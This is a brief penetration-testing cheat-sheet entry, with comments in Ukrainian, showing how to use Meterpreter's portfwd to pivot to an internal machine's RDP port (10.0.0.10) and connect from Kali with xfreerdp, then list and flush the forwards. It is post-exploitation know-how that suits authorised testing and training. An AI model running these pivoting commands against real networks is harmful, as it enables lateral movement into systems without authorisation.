Port Forwarding

# RDP внутрішньої машини meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.0.10 # З Kali: $ xfreerdp /u:Admin /v:127.0.0.1:3389 # Список / видалення meterpreter> portfwd list meterpreter> portfwd flush
